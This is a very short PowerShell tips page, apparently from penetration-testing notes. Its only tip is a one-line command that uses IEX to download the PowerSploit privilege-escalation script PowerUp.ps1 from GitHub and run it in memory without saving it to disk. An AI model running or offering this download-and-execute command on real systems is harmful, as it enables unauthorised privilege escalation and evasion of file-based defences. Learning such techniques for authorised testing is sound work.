---
description: Some tips to use on powershell
---

# Powershell

### Execute .ps1

If you want to execute .ps1 file without storing it, you can use IEX :&#x20;

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Privesc/PowerUp.ps1')
```
